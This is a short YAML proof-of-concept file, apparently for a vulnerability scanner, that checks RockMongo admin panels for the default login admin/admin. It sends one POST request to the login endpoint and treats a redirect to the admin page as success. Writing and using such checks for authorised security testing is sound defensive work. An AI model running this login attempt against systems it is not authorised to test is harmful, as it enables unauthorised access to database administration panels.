id: poc-yaml-rockmongo-default-password
info:
  name: Rockmongo 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Rockmongo
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /index.php?action=login.index&host=0
  headers: {}
  data: more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 302 && contains(headers, "Location") && contains(headers,
    "/index.php?action=admin.index&host=0")
  output: []
